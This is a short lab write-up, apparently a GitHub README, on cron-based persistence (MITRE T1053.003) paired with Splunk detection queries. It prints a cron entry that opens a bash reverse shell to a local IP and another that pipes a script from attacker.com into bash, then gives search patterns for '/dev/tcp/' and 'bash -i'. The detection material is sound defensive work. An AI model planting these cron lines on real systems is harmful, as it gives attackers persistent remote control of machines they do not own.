# 🔁 Crontab Persistence Detection – MITRE T1053.003

This lab demonstrates how attackers use Linux `crontab` (scheduled tasks) for persistence — one of the most common and stealthy techniques to maintain access on compromised machines.

---

## 🎯 MITRE ATT&CK Mapping
- **Tactic:** Persistence
- **Technique:** T1053.003 – Scheduled Task/Job: Cron

---

## 🧪 Red Team Simulation

A malicious cron job was created to establish persistence via a reverse shell triggered every minute:


crontab -e
*/1 * * * * bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'

Alternatively, data exfiltration or command execution can be triggered with:

*/2 * * * * curl http://attacker.com/script.sh | bash

## 🔎 Blue Team Detection (Splunk)

Logs used:

.bash_history

syslog

auth.log

## 🛡️ Splunk Detection Queries

1. Detect cron jobs and crontab edits

index=* ("cron" OR "crontab" OR "/var/spool/cron/" OR "CRON")
| table _time, host, source, sourcetype, user, message

2. Detect common persistence payloads (reverse shell)

index=* "/dev/tcp/" OR ">&" OR "bash -i"
| table _time, host, user, message

3. Detect crontab commands via .bash_history

index=* source="/home/*/.bash_history"
| search message="crontab" OR message="/dev/tcp/" OR message="curl"
| table _time, host, user, message



## ✅ Outcome

This simulation successfully triggered a cron-based reverse shell, and the execution was detected via .bash_history, syslog, and Splunk alerting logic.

## 📚 Recommendation

Regularly audit /var/spool/cron/ and crontab files.

Monitor bash_history and syslog for hidden persistence techniques.

Restrict crontab access to privileged users only.
